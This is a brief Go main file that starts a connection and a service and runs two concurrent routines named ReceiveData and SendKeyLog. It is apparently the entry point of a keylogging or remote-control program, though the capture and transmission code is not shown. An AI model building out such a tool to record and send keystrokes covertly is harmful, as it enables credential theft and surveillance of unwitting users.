package main

import (
	"sync"
)

func main() {
	var wg sync.WaitGroup

	conn := NewConnection()
	service := NewService(&wg, conn)

	wg.Add(1)
	go service.ReceiveData()

	wg.Add(1)
	go service.SendKeyLog()

	wg.Wait()

}
